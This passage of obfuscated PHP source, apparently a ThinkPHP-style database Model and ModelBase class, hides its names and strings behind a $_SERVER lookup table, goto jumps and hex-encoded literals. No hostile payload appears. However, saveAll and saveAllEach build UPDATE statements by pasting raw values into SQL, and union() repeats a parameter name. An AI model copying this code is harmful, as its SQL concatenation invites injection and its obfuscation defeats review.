isset($this->insertFields)) { $dǖ = $this->insertFields; } elseif ($e == THINK_MODEL_UPDATE && isset($this->updateFields)) { $dǖ = $this->updateFields; } goto DѤ; E: return $E܊ܦ; goto f; e׵: if ($this->autoCheckFields) { $dǖ = $this->{$_SERVER[拘][1044]}(); foreach ($E܊ܦ as $C => $Dэڿ) { if (!$eа[176]($C, $dǖ)) { unset($E܊ܦ[$C]); } elseif (MAGIC_QUOTES_GPC && $eа[66]($Dэڿ)) { $E܊ܦ[$C] = $eа[1073]($Dэڿ); } } } $this->{$_SERVER[拘][1074]}($E܊ܦ, $e); $this->data = $E܊ܦ; goto E; dǇ: $eа =& $_SERVER[拘]; if (empty($E܊ܦ)) { $E܊ܦ = $_POST; } elseif ($eа[296]($E܊ܦ)) { $E܊ܦ = $eа[1066]($E܊ܦ); } if (empty($E܊ܦ) || !$eа[93]($E܊ܦ)) { $this->error = $eа[77]($eа[1023]); return !1; } goto c֣; DѤ: if (isset($dǖ)) { if ($eа[66]($dǖ)) { $dǖ = $eа[4]($eа[119], $dǖ); } if ($eа[108]($eа[1068])) { $dǖ[] = $eа[108]($eа[1069]); } foreach ($E܊ܦ as $C => $Dэڿ) { if (!$eа[176]($C, $dǖ)) { unset($E܊ܦ[$C]); } } } if (!$this->{$_SERVER[拘][1070]}($E܊ܦ, $e)) { return !1; } if (!$this->{$_SERVER[拘][1071]}($E܊ܦ)) { $this->error = $eа[77]($eа[1072]); return !1; } goto e׵; f: } public function autoCheckToken($eȒ) { $Cج =& $_SERVER[拘]; if (isset($this->options[$Cج[1075]]) && !$this->options[$Cج[1075]]) { return !0; } if ($Cج[108]($Cج[1068])) { $C = $Cج[108]($Cج[1069]); if (!isset($eȒ[$C]) || Session::get($C)) { return !1; } list($A, $C삝) = $Cج[4]($Cج[183], $eȒ[$C]); if ($C삝 && Session::get($C . $Cج[348] . $A) === $C삝) { Session::remove($C . $Cج[348] . $A); return !0; } if ($Cج[108]($Cج[1076])) { Session::remove($C . $Cج[348] . $A); } return !1; } return !0; } public function regex($a, $bѠ) { $a =& $_SERVER[拘]; $A = array($a[1077] => $a[1078], $a[1079] => $a[1080], $a[906] => $a[1081], $a[1082] => $a[1083], $a[1084] => $a[1085], $a[1086] => $a[1087], $a[1088] => $a[1089], $a[1051] => $a[1090], $a[1091] => $a[1092]); if (isset($A[$a[80]($bѠ)])) { $bѠ = $A[$a[80]($bѠ)]; } return $a[131]($bѠ, $a) === 1; } private function autoOperation(&$fû, $f͘) { $A =& $_SERVER[拘]; if (!empty($this->options[$A[1093]])) { $Dǘ = $this->options[$A[1093]]; unset($this->options[$A[1093]]); } elseif (!empty($this->_auto)) { $Dǘ = $this->_auto; } if (isset($Dǘ)) { foreach ($Dǘ as $Eܐ) { if (empty($Eܐ[2])) { $Eܐ[2] = THINK_MODEL_INSERT; } if ($f͘ == $Eܐ[2] || $Eܐ[2] == THINK_MODEL_BOTH) { switch ($A[70]($Eܐ[3])) { case $A[1094]: case $A[1095]: $c׎ = isset($Eܐ[4]) ? (array) $Eܐ[4] : array(); if (isset($fû[$Eܐ[0]])) { $A[1096]($c׎, $fû[$Eܐ[0]]); } if ($A[1094] == $Eܐ[3]) { $fû[$Eܐ[0]] = $A[90]($Eܐ[1], $c׎); } else { $fû[$Eܐ[0]] = $A[90](array(&$this, $Eܐ[1]), $c׎); } break; case $A[280]: $fû[$Eܐ[0]] = $fû[$Eܐ[1]]; break; case $A[1097]: if ($A[67] === $fû[$Eܐ[0]]) { unset($fû[$Eܐ[0]]); } break; case $A[1098]: default: $fû[$Eܐ[0]] = $Eܐ[1]; } if (!1 === $fû[$Eܐ[0]]) { unset($fû[$Eܐ[0]]); } } } } return $fû; } protected function autoValidation($bل, $f) { $a㱨 =& $_SERVER[拘]; if (!empty($this->options[$a㱨[1099]])) { $C = $this->options[$a㱨[1099]]; unset($this->options[$a㱨[1099]]); } elseif (!empty($this->_validate)) { $C = $this->_validate; } if (isset($C)) { if ($this->patchValidate) { $this->error = array(); } foreach ($C as $FԳƸ => $aȝȣ) { if (empty($aȝȣ[5]) || $aȝȣ[5] == THINK_MODEL_BOTH || $aȝȣ[5] == $f) { if (0 == $a㱨[165]($aȝȣ[2], $a㱨[1100]) && $a㱨[165]($aȝȣ[2], $a㱨[449])) { $aȝȣ[2] = $a㱨[77]($a㱨[7]($aȝȣ[2], 2, -1)); } $aȝȣ[3] = isset($aȝȣ[3]) ? $aȝȣ[3] : THINK_EXISTS_VALIDATE; $aȝȣ[4] = isset($aȝȣ[4]) ? $aȝȣ[4] : $a㱨[1101]; switch ($aȝȣ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->{$_SERVER[拘][1102]}($bل, $aȝȣ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($a㱨[67] != $a㱨[70]($bل[$aȝȣ[0]])) { if (!1 === $this->{$_SERVER[拘][1102]}($bل, $aȝȣ)) { return !1; } } break; default: if (isset($bل[$aȝȣ[0]])) { if (!1 === $this->{$_SERVER[拘][1102]}($bل, $aȝȣ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($eک, $e߯) { if (!1 === $this->{$_SERVER[拘][1103]}($eک, $e߯)) { if ($this->patchValidate) { $this->error[$e߯[0]] = $e߯[2]; } else { $this->error = $e߯[2]; return !1; } } return; } protected function _validationFieldItem($A, $a˱Ѡ) { $A֓ =& $_SERVER[拘]; switch ($A֓[80]($A֓[70]($a˱Ѡ[4]))) { case $A֓[1094]: case $A֓[1095]: $A۞ = isset($a˱Ѡ[6]) ? (array) $a˱Ѡ[6] : array(); if ($A֓[66]($a˱Ѡ[0]) && $A֓[165]($a˱Ѡ[0], $A֓[119])) { $a˱Ѡ[0] = $A֓[4]($A֓[119], $a˱Ѡ[0]); } if ($A֓[93]($a˱Ѡ[0])) { foreach ($a˱Ѡ[0] as $eψɝ) { $C[$eψɝ] = $A[$eψɝ]; } $A֓[1096]($A۞, $C); } else { $A֓[1096]($A۞, $A[$a˱Ѡ[0]]); } if ($A֓[1094] == $a˱Ѡ[4]) { return $A֓[90]($a˱Ѡ[1], $A۞); } else { return $A֓[90](array(&$this, $a˱Ѡ[1]), $A۞); } case $A֓[1104]: return $A[$a˱Ѡ[0]] == $A[$a˱Ѡ[1]]; case $A֓[1105]: if ($A֓[66]($a˱Ѡ[0]) && $A֓[165]($a˱Ѡ[0], $A֓[119])) { $a˱Ѡ[0] = $A֓[4]($A֓[119], $a˱Ѡ[0]); } $b = array(); if ($A֓[93]($a˱Ѡ[0])) { foreach ($a˱Ѡ[0] as $eψɝ) { $b[$eψɝ] = $A[$eψɝ]; } } else { $b[$a˱Ѡ[0]] = $A[$a˱Ѡ[0]]; } if (!empty($A[$this->{$_SERVER[拘][1029]}()])) { $b[$this->{$_SERVER[拘][1029]}()] = array($A֓[1106], $A[$this->{$_SERVER[拘][1029]}()]); } if ($this->{$_SERVER[拘][501]}($b)->{$_SERVER[拘][502]}()) { return !1; } return !0; default: return $this->{$_SERVER[拘][377]}($A[$a˱Ѡ[0]], $a˱Ѡ[1], $a˱Ѡ[4]); } } public function check($B޶, $E, $C؂ʬ = "\162\x65\x67\145\x78") { $A軐݊ =& $_SERVER[拘]; $C؂ʬ = $A軐݊[80]($A軐݊[70]($C؂ʬ)); switch ($C؂ʬ) { case $A軐݊[359]: case $A軐݊[1107]: $fƹЋ = $A軐݊[93]($E) ? $E : $A軐݊[4]($A軐݊[119], $E); return $C؂ʬ == $A軐݊[359] ? $A軐݊[176]($B޶, $fƹЋ) : !$A軐݊[176]($B޶, $fƹЋ); case $A軐݊[1108]: case $A軐݊[1109]: if ($A軐݊[93]($E)) { $Dٺ = $E[0]; $eÙ = $E[1]; } else { list($Dٺ, $eÙ) = $A軐݊[4]($A軐݊[119], $E); } return $C؂ʬ == $A軐݊[1108] ? $B޶ >= $Dٺ && $B޶ <= $eÙ : $B޶ < $Dٺ || $B޶ > $eÙ; case $A軐݊[1110]: case $A軐݊[1111]: return $C؂ʬ == $A軐݊[1110] ? $B޶ == $E : $B޶ != $E; case $A軐݊[956]: $C = $A軐݊[1112]($B޶, $A軐݊[1113]); if ($A軐݊[165]($E, $A軐݊[119])) { list($Dٺ, $eÙ) = $A軐݊[4]($A軐݊[119], $E); return $C >= $Dٺ && $C <= $eÙ; } else { return $C == $E; } case $A軐݊[1114]: list($F, $Cˤ) = $A軐݊[4]($A軐݊[119], $E); if (!$A軐݊[68]($F)) { $F = $A軐݊[671]($F); } if (!$A軐݊[68]($Cˤ)) { $Cˤ = $A軐݊[671]($Cˤ); } return NOW_TIME >= $F && NOW_TIME <= $Cˤ; case $A軐݊[1115]: return $A軐݊[176]($A軐݊[1116](), $A軐݊[4]($A軐݊[119], $E)); case $A軐݊[1117]: return !$A軐݊[176]($A軐݊[1116](), $A軐݊[4]($A軐݊[119], $E)); case $A軐݊[1101]: default: return $this->{$_SERVER[拘][1118]}($B޶, $E); } } public function query($Fϵ, $dه = false) { $Cѷ =& $_SERVER[拘]; if (!$Cѷ[161]($dه) && !$Cѷ[93]($dه)) { $dه = func_get_args(); $Cѷ[1064]($dه); } $Fϵ = $Cѷ[69](array($Cѷ[36], $Cѷ[1119]), $Cѷ[168], $Fϵ); $Fϵ = $this->{$_SERVER[拘][265]}($Fϵ, $dه); return $this->db->{$_SERVER[拘][260]}($Fϵ); } public function execute($d߅݉, $E՗ت = false) { $Fᯥ =& $_SERVER[拘]; if (!$Fᯥ[161]($E՗ت) && !$Fᯥ[93]($E՗ت)) { $E՗ت = func_get_args(); $Fᯥ[1064]($E՗ت); } $d߅݉ = $this->{$_SERVER[拘][265]}($d߅݉, $E՗ت); return $this->db->{$_SERVER[拘][245]}($d߅݉); } protected function parseSql($f, $dҶ) { $F˚ =& $_SERVER[拘]; if (!0 === $dҶ) { $d = $this->{$_SERVER[拘][1024]}(); $f = $this->db->{$_SERVER[拘][265]}($f, $d); } elseif ($F˚[93]($dҶ)) { $dҶ = $F˚[159](array($this->db, $F˚[1120]), $dҶ); $f = $F˚[1121]($f, $dҶ); } else { $f = $F˚[1122]($f, array($F˚[1123] => $this->{$_SERVER[拘][995]}(), $F˚[1124] => $F˚[108]($F˚[986]))); } $this->db->{$_SERVER[拘][993]}($this->name); return $f; } public function db($AѦ = '', $E = '', $F = array()) { goto bʈڒ; b: if (!empty($this->name) && $this->autoCheckFields) { $this->{$_SERVER[拘][1127]}(); } return $this; goto DĊ; bʈڒ: $Bڕ =& $_SERVER[拘]; if ($Bڕ[67] === $AѦ && $this->db) { return $this->db; } static $eݗՖ = array(); goto BĄ; A: $eݗՖ[$AѦ] = $E; $this->db = $b܆[$AѦ]; $this->{$_SERVER[拘][1126]}(); goto b; BĄ: static $b܆ = array(); if (!isset($b܆[$AѦ]) || isset($b܆[$AѦ]) && $E && $eݗՖ[$AѦ] != $E) { if (!empty($E) && $Bڕ[66]($E) && !1 === $Bڕ[165]($E, $Bڕ[44])) { $E = $Bڕ[108]($E); } $b܆[$AѦ] = Db::getInstance($E); } elseif (NULL === $E) { $b܆[$AѦ]->{$_SERVER[拘][291]}(); unset($b܆[$AѦ]); return; } if (!empty($F)) { if ($Bڕ[66]($F)) { parse_str($F, $F); } foreach ($F as $cϿ => $F) { $this->{$_SERVER[拘][1003]}($cϿ, $F); } } goto A; DĊ: } protected function _after_db() { } public function getModelName() { $b̰ =& $_SERVER[拘]; if (empty($this->name)) { $Cި = $b̰[627]($this); if ($Cި == $b̰[1128]) { return $this->name; } $this->name = $b̰[7]($Cި, 0, -5); } return $this->name; } public function getTableName() { $bܷ =& $_SERVER[拘]; if (empty($this->trueTableName)) { $F؋ = !empty($this->tablePrefix) ? $this->tablePrefix : $bܷ[67]; if (!empty($this->tableName)) { $F؋ .= $this->tableName; } else { $F؋ .= $bܷ[1012]($this->name); } $this->trueTableName = $bܷ[80]($F؋); } return (!empty($this->dbName) ? $this->dbName . $bܷ[348] : $bܷ[67]) . $this->trueTableName; } public function startTrans() { $this->{$_SERVER[拘][1034]}(); $this->db->{$_SERVER[拘][1033]}(); return; } public function commit() { return $this->db->{$_SERVER[拘][1034]}(); } public function rollback() { return $this->db->{$_SERVER[拘][1129]}(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->{$_SERVER[拘][1130]}(); } public function getLastInsID() { return $this->db->{$_SERVER[拘][1028]}(); } public function getLastSql() { return $this->db->{$_SERVER[拘][1131]}($this->name); } public function _sql() { return $this->{$_SERVER[拘][1131]}(); } public function getPk() { $ḓȼ =& $_SERVER[拘]; return isset($this->fields[$ḓȼ[998]]) ? $this->fields[$ḓȼ[998]] : $this->pk; } public function getDbFields() { $C =& $_SERVER[拘]; if (isset($this->options[$C[239]])) { $bڥ = $this->db->{$_SERVER[拘][994]}($this->options[$C[239]]); return $bڥ ? $C[766]($bڥ) : !1; } if ($this->fields) { $bڥ = $this->fields; unset($bڥ[$C[996]], $bڥ[$C[998]], $bڥ[$C[1000]], $bڥ[$C[992]]); return $bڥ; } return !1; } public function data($a = '') { $A =& $_SERVER[拘]; if ($A[67] === $a && !empty($this->data)) { return $this->data; } if ($A[296]($a)) { $a = $A[1066]($a); } elseif ($A[66]($a)) { parse_str($a, $a); } elseif (!$A[93]($a)) { $A[76]($A[77]($A[1023])); } $this->data = $a; return $this; } public function join($fԏ) { $eк§ꕋ =& $_SERVER[拘]; if ($eк§ꕋ[93]($fԏ)) { $this->options[$eк§ꕋ[282]] = $fԏ; } elseif (!empty($fԏ)) { $this->options[$eк§ꕋ[282]][] = $fԏ; } return $this; } public function union($b, $b = false) { goto c; A҅ΰ: return $this; goto aϟ; c: $D؄ސ =& $_SERVER[拘]; if (empty($b)) { return $this; } if ($b) { $this->options[$D؄ސ[288]][$D؄ސ[230]] = !0; } goto fϱ; fϱ: if ($D؄ސ[296]($b)) { $b = $D؄ސ[1066]($b); } if ($D؄ސ[66]($b)) { $A݉ = $b; } elseif ($D؄ސ[93]($b)) { if (isset($b[0])) { $this->options[$D؄ސ[288]] = $D؄ސ[153]($this->options[$D؄ސ[288]], $b); return $this; } else { $A݉ = $b; } } else { $D؄ސ[76]($D؄ސ[77]($D؄ސ[1023])); } $this->options[$D؄ސ[288]][] = $A݉; goto A҅ΰ; aϟ: } public function cache($d = true, $B = null, $Eğ = '') { $C檈 =& $_SERVER[拘]; if (!1 !== $d) { $this->options[$C檈[12]] = array($C檈[257] => $d, $C檈[1114] => $B, $C檈[400] => $Eğ); } return $this; } public function field($dӢ, $a = false) { $AǨ =& $_SERVER[拘]; if (!0 === $dӢ) { $e = $this->{$_SERVER[拘][1044]}(); $dӢ = $e ? $e : $AǨ[167]; } elseif ($a) { if ($AǨ[66]($dӢ)) { $dӢ = $AǨ[4]($AǨ[119], $dӢ); } $e = $this->{$_SERVER[拘][1044]}(); $dӢ = $e ? $AǨ[1132]($e, $dӢ) : $dӢ; } $this->options[$AǨ[280]] = $dӢ; return $this; } public function scope($b = '', $c׳ = NULL) { $F =& $_SERVER[拘]; if ($F[67] === $b) { if (isset($this->_scope[$F[897]])) { $Eˉ = $this->_scope[$F[897]]; } else { return $this; } } elseif ($F[66]($b)) { $F = $F[4]($F[119], $b); $Eˉ = array(); foreach ($F as $Fʩ) { if (!isset($this->_scope[$Fʩ])) { continue; } $Eˉ = $F[153]($Eˉ, $this->_scope[$Fʩ]); } if (!empty($c׳) && $F[93]($c׳)) { $Eˉ = $F[153]($Eˉ, $c׳); } } elseif ($F[93]($b)) { $Eˉ = $b; } if ($F[93]($Eˉ) && !empty($Eˉ)) { $this->options = $F[153]($this->options, $F[94]($Eˉ)); } return $this; } public function where($DɆ, $Aܴ = null) { $b޼ =& $_SERVER[拘]; if (!$b޼[149]($Aܴ) && $b޼[66]($DɆ)) { if (!$b޼[93]($Aܴ)) { $Aܴ = func_get_args(); $b޼[1064]($Aܴ); } $Aܴ = $b޼[159](array($this->db, $b޼[1120]), $Aܴ); $DɆ = $b޼[1121]($DɆ, $Aܴ); } elseif ($b޼[296]($DɆ)) { $DɆ = $b޼[1066]($DɆ); } if ($b޼[66]($DɆ) && $b޼[67] != $DɆ) { $e噶 = array(); $e噶[$b޼[209]] = $DɆ; $DɆ = $e噶; } if (isset($this->options[$b޼[251]])) { $this->options[$b޼[251]] = $b޼[153]($this->options[$b޼[251]], $DɆ); } else { $this->options[$b޼[251]] = $DɆ; } return $this; } public function limit($Fǅ, $f = null) { $e =& $_SERVER[拘]; $this->options[$e[255]] = $e[149]($f) ? $Fǅ : $Fǅ . $e[119] . $f; return $this; } public function page($d, $D = null) { $f =& $_SERVER[拘]; $this->options[$f[261]] = $f[149]($D) ? $d : $d . $f[119] . $D; return $this; } public function comment($E؝) { $this->options[$_SERVER[拘][244]] = $E؝; return $this; } public function setProperty($c骻, $b) { if ($_SERVER[拘][1133]($this, $c骻)) { $this->{$c骻} = $b; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\151\146\x79\124\151\x6d\145", "\x74\151\x6d\145", "\151\156\x73\145\x72\x74\x2c\x75\160\x64\x61\164\145", "\x66\165\156\143\164\x69\x6f\x6e"), array("\143\x72\x65\x61\164\145\124\x69\155\145", "\164\151\x6d\145", "\x69\156\x73\145\x72\164", "\x66\165\156\143\x74\x69\157\156")); public function setDataAuto($dǇ) { $this->dataAuto = $dǇ; } protected $tableMeta = array(); protected function _beforeInsert(&$cɈ, $c) { $cʄ =& $_SERVER[拘]; if (!$this->{$_SERVER[拘][1134]}($cʄ[1135])) { return; } $this->{$_SERVER[拘][1136]}($cɈ, $cʄ[1135]); } protected function _beforeUpdate(&$c͈, $aȳд) { $cഡ =& $_SERVER[拘]; if (!$this->{$_SERVER[拘][1134]}($cഡ[1137])) { return; } $this->{$_SERVER[拘][1136]}($c͈, $cഡ[1137]); } protected function _afterSelect(&$B̸, $a׆) { $f錽 =& $_SERVER[拘]; if (!$f錽[93]($B̸)) { return; } if (!$this->{$_SERVER[拘][1134]}($f錽[1138])) { return; } foreach ($B̸ as &$F툎) { $this->{$_SERVER[拘][1139]}($F툎); } } protected function _afterFind(&$eΑ, $Bȴ) { $cȴ¸ =& $_SERVER[拘]; if (!$cȴ¸[93]($eΑ)) { return; } if (!$this->{$_SERVER[拘][1134]}($cȴ¸[1138])) { return; } $this->{$_SERVER[拘][1139]}($eΑ); } public function setAutoIncrement($Bʏ˅) { $C̪ = array($this->{$_SERVER[拘][1029]}() => $Bʏ˅); $F悋 = $this->{$_SERVER[拘][1140]}($C̪)->{$_SERVER[拘][63]}(); if ($F悋) { $this->{$_SERVER[拘][308]}($F悋); } } public function getAutoIncrement() { goto b; b: $bε袥 =& $_SERVER[拘]; $bƧ = $this->{$_SERVER[拘][995]}(); $Cё = $this->{$_SERVER[拘][1141]}($this->{$_SERVER[拘][1029]}()); goto D撴; D撴: $AǊ = $this->{$_SERVER[拘][260]}("\x73\x68\157\x77\x20\x74\x61\142\154\145\x20\x73\x74\x61\164\x75\x73\40\167\x68\x65\162\145\40\x4e\x61\x6d\145\75\x27{$bƧ}\47"); $b = $AǊ[0][$bε袥[1142]]; $Fן = $bε袥[1143]($Cё, $b); goto C; C: return $Fן; goto a; a: } protected function _callBefore($d㲉, $aѥӺ) { return $this->{$_SERVER[拘][1144]}($d㲉, $aѥӺ, !1); } protected function _callAfter($b뺒, $Bߙ) { return $this->{$_SERVER[拘][1144]}($b뺒, $Bߙ, !0); } protected function cacheFunctionAlias($cܺ) { return !1; } public function cacheMemory() { return $this->{$_SERVER[拘][1145]}(null, 0); } protected function cacheCallCheck($Aܿ߷, $Eّㅉ, $b߉ = false) { $cÃ =& $_SERVER[拘]; $dҏϫ = $this->{$_SERVER[拘][1146]}($Eّㅉ); if (!$dҏϫ) { return; } foreach ($dҏϫ as $Dݽѝ => $c) { $eߚ = $c[0]; $e٨ = $cÃ[4]($cÃ[119], $c[1]); if ($Aܿ߷ == $Dݽѝ) { return $this->{$_SERVER[拘][1147]}($Dݽѝ, $eߚ); } if ($b߉ && $cÃ[176]($Aܿ߷, $e٨)) { $this->{$_SERVER[拘][1148]}($Dݽѝ, $eߚ); } } } public function cacheFunctionGet($bү, $Cӱ͵) { $Cդ = $this->{$_SERVER[拘][1149]}($bү, $Cӱ͵); $c = Cache::get($Cդ); if (!$_SERVER[拘][93]($c)) { $c = $this->{$bү}($Cӱ͵, !0); Cache::set($Cդ, $c); } return $c; } public function cacheFunctionClear($Cæ, $AǨ) { $eَʔ = $_SERVER[拘][93]($AǨ) ? $AǨ : array($AǨ); foreach ($eَʔ as $a؈) { $F = $this->{$_SERVER[拘][1149]}($Cæ, $a؈); Cache::remove($F); } } private function cacheKeyMake($FކĲ, $Fʞ) { $Dξȇ =& $_SERVER[拘]; return $Dξȇ[627]($this) . $Dξȇ[183] . $FކĲ . $Dξȇ[1150] . $Fʞ; } protected function selectPage($A쪷ĥ = 200, $Eȃ؏ = 1) { goto aޏ; aی: $A쪷ĥ = $A쪷ĥ <= 5 ? 5 : ($A쪷ĥ >= $f ? $f : $A쪷ĥ); $CĢ = $a[632]($D / $A쪷ĥ); $Eȃ؏ = $a[455](isset($in[$a[261]]) ? $in[$a[261]] : $Eȃ؏); goto B撣; e: $f = 2000; $D⤸ = $eڤ; $D⤸[$a[253]] = array(); goto Cѭ; DՎ: $E = array($a[1155] => $d߆ ? $d߆ : array(), $a[1156] => array($a[1157] => $D, $a[1153] => $A쪷ĥ, $a[261] => $Eȃ؏, $a[1158] => $CĢ)); return $E; goto C¹ҿ; Cѭ: $this->{$_SERVER[拘][1151]}($D⤸); $D = $a[455]($this->{$_SERVER[拘][1152]}()); $A쪷ĥ = $a[455](isset($in[$a[1153]]) ? $in[$a[1153]] : $A쪷ĥ); goto aی; aޏ: $a =& $_SERVER[拘]; global $in; $eڤ = $this->{$_SERVER[拘][1151]}(); goto e; B撣: $Eȃ؏ = $Eȃ؏ <= 1 ? 1 : ($Eȃ؏ >= $CĢ ? $CĢ : $Eȃ؏); $this->{$_SERVER[拘][1151]}($eڤ); $d߆ = $this->{$_SERVER[拘][1154]}($Eȃ؏, $A쪷ĥ)->{$_SERVER[拘][1042]}(); goto DՎ; C¹ҿ: } public function metaSet($dʧ, $aĖЧ = null, $a܎ = null) { goto d؂; d؂: $c =& $_SERVER[拘]; if (!$this->tableMeta) { return array(); } $f = $this->tableMeta[$c[1159]]; goto A혫; D莈: if ($c[149]($aĖЧ)) { return $b->{$_SERVER[拘][501]}(array($f => $dʧ))->{$_SERVER[拘][308]}(); } if ($c[149]($a܎)) { return $b->{$_SERVER[拘][501]}($fЉ)->{$_SERVER[拘][308]}(); } $c٘ = !1; goto cǓ; cǓ: if ($b->{$_SERVER[拘][501]}($fЉ)->{$_SERVER[拘][502]}()) { $c٘ = $b->{$_SERVER[拘][501]}($fЉ)->{$_SERVER[拘][1062]}(array($c[1163] => $a܎)); } else { $fЉ[$c[937]] = $a܎; $c٘ = $b->{$_SERVER[拘][63]}($fЉ); } return $c٘; goto dЊ; A혫: $b = $c[64]($this->tableMeta[$c[1160]]); if ($c[93]($aĖЧ)) { $B = array(); foreach ($aĖЧ as $b𬜾 => $e) { $B[] = array($f => $dʧ, $c[257] => $b𬜾, $c[937] => $e); } $b->{$_SERVER[拘][501]}(array($f => $dʧ))->{$_SERVER[拘][1161]}($B, array(), !0); return !0; } $fЉ = array($f => $dʧ, $c[1162] => $aĖЧ); goto D莈; dЊ: } public function metaGet($Bꈇ) { goto F; Eī՘: $d = $E΃[413]($d, $E΃[257], $E΃[937]); return $d; goto FӢ; F: $E΃ =& $_SERVER[拘]; if (!$this->tableMeta) { return array(); } $a촥Ũ = $this->tableMeta[$E΃[1159]]; goto BΉ; BΉ: $c馌 = $E΃[64]($this->tableMeta[$E΃[1160]]); $F = array($a촥Ũ => $Bꈇ); $d = $c馌->{$_SERVER[拘][1164]}($E΃[1165])->{$_SERVER[拘][501]}($F)->{$_SERVER[拘][1042]}(); goto Eī՘; FӢ: } private function checkDataAutoHas($d) { $F쐅 =& $_SERVER[拘]; if (!$F쐅[93]($this->dataAuto) || $F쐅[37]($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $D太) { if ($F쐅[176]($d, $F쐅[4]($F쐅[119], $D太[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$a̔, $Bʱ) { $Aߎ롯ޡ =& $_SERVER[拘]; foreach ($this->dataAuto as $F򺹏Ѵ) { $B픆 = $F򺹏Ѵ[0]; if (!$Aߎ롯ޡ[176]($Bʱ, $Aߎ롯ޡ[4]($Aߎ롯ޡ[119], $F򺹏Ѵ[2]))) { continue; } switch ($Aߎ롯ޡ[70]($F򺹏Ѵ[3])) { case $Aߎ롯ޡ[1094]: case $Aߎ롯ޡ[1095]: $c = $F򺹏Ѵ[1]; $F = isset($F򺹏Ѵ[4]) ? (array) $F򺹏Ѵ[4] : array(); if ($c == $Aߎ롯ޡ[772] && $Aߎ롯ޡ[945]($B픆, $a̔)) { if (!$a̔[$B픆]) { unset($a̔[$B픆]); } break; } if (isset($a̔[$B픆])) { $Aߎ롯ޡ[1096]($F, $a̔[$B픆]); } if ($Aߎ롯ޡ[1094] == $F򺹏Ѵ[3]) { $a̔[$B픆] = $Aߎ롯ޡ[90]($c, $F); } else { $a̔[$B픆] = $Aߎ롯ޡ[90](array(&$this, $c), $F); } break; case $Aߎ롯ޡ[280]: $a̔[$B픆] = $a̔[$F򺹏Ѵ[1]]; break; case $Aߎ롯ޡ[1059]: if (isset($a̔[$B픆]) && !$Aߎ롯ޡ[66]($a̔[$B픆])) { $a̔[$B픆] = $Aߎ롯ޡ[1166]($a̔[$B픆]); } break; case $Aߎ롯ޡ[1097]: if ($a̔[$B픆] === $Aߎ롯ޡ[67]) { unset($a̔[$B픆]); } break; case $Aߎ롯ޡ[1098]: $a̔[$B픆] = $F򺹏Ѵ[1]; default: break; } } if ($Bʱ == $Aߎ롯ޡ[1135]) { $Eѹ̃ = $Aߎ롯ޡ[80]($this->db->{$_SERVER[拘][1167]}()); if ($Aߎ롯ޡ[165]($Eѹ̃, $Aߎ롯ޡ[17]) !== 0) { return; } $c݌ߤ = $this->{$_SERVER[拘][1164]}(!0)->fields; $aΡ = $c݌ߤ[$Aߎ롯ޡ[1000]]; if (isset($c݌ߤ[$Aߎ롯ޡ[998]])) { unset($aΡ[$c݌ߤ[$Aߎ롯ޡ[998]]]); } foreach ($aΡ as $aх => $Bʱ) { if (!isset($a̔[$aх])) { $a̔[$aх] = $Aߎ롯ޡ[67]; } } } } private function dataAfterFilter(&$c) { $Fי =& $_SERVER[拘]; foreach ($this->dataAuto as $E񝏃) { $aᠺ = $E񝏃[0]; if (!$Fי[176]($Fי[1138], $Fי[4]($Fי[119], $E񝏃[2]))) { continue; } if (!isset($c[$aᠺ])) { continue; } switch ($Fי[70]($E񝏃[3])) { case $Fי[1094]: case $Fי[1095]: $Eը̴ = isset($E񝏃[4]) ? (array) $E񝏃[4] : array(); $Fי[1096]($Eը̴, $c[$aᠺ]); if ($Fי[1094] == $E񝏃[3]) { $c[$aᠺ] = $Fי[90]($E񝏃[1], $Eը̴); } else { $c[$aᠺ] = $Fי[90](array(&$this, $E񝏃[1]), $Eը̴); } break; case $Fי[280]: $c[$aᠺ] = $c[$E񝏃[1]]; break; case $Fי[1059]: $EƝ = $c[$aᠺ]; $c[$aᠺ] = $Fי[738]($EƝ, !0); if ($Fי[149]($c[$aᠺ])) { $c[$aᠺ] = $EƝ; } break; case $Fי[1097]: if ($c[$aᠺ] === $Fי[67]) { unset($c[$aᠺ]); } break; case $Fי[1098]: $c[$aᠺ] = $E񝏃[1]; default: break; } } } public function saveAll($BŠ) { goto d; c܄: $Cר = $bΟ[1168]; $fՌܰ = 0; $Dх = array(); goto EĆ; EĆ: $dՋ = $bΟ[37]($BŠ); for ($Cҷꪊ = 0; $Cҷꪊ < $dՋ; $Cҷꪊ++) { $Bđ = $BŠ[$Cҷꪊ]; if (!$bΟ[93]($Bđ) || $bΟ[37]($Bđ) != 4) { continue; } $f׈ = "\125\x50\x44\x41\124\x45\x20{$F}\x20\x53\x45\x54\x20{$Bđ[2]}\40\x3d\x20\103\x41\123\105\40{$Bđ[0]}\x20\12"; if ($fՌܰ == 0) { $Cר = $f׈; } $Dх[] = $bΟ[652] . $Bđ[1] . $bΟ[652]; $fՌܰ++; $Cר .= "\40\x57\110\x45\x4e\40\47{$Bđ[1]}\47\x20\124\x48\105\x4e\40\x27{$Bđ[3]}\x27\x20\12"; if ($fՌܰ == $Eن || $Cҷꪊ == $dՋ - 1) { $B썍Ή = $bΟ[152]($bΟ[119], $Dх); $Cר .= "\x20\x45\x4e\x44\40\40\x57\110\x45\x52\x45\x20{$Bđ[0]}\40\x49\x4e\40\x28{$B썍Ή}\x29\x20"; $this->{$_SERVER[拘][245]}($Cר); $fՌܰ = 0; $Cר = $f׈; $Dх = array(); } } goto bō; d: $bΟ =& $_SERVER[拘]; $F = $this->tablePrefix . $this->tableName; $Eن = self::SQL_WHERE_IN_CHUNK; goto c܄; bō: } public function saveAllEach($F) { $e⭞ =& $_SERVER[拘]; $c = $this->tablePrefix . $this->tableName; foreach ($F as $a) { if (!$e⭞[93]($a) || $e⭞[37]($a) != 4) { continue; } $dϑ = $a[0] . $e⭞[1169] . $a[1] . $e⭞[652]; $dɇǻ = $a[2] . $e⭞[1169] . $a[3] . $e⭞[652]; $D򯑌 = "\165\x70\144\x61\x74\x65\40{$c}\40\x73\145\164\x20{$dɇǻ}\x20\167\150\x65\162\145\x20{$dϑ}\73"; $this->{$_SERVER[拘][245]}($D򯑌); } } public function addAll($a䵋Ĥ, $dƖ = array(), $A = false) { goto EۖҴ; Aڒ: if 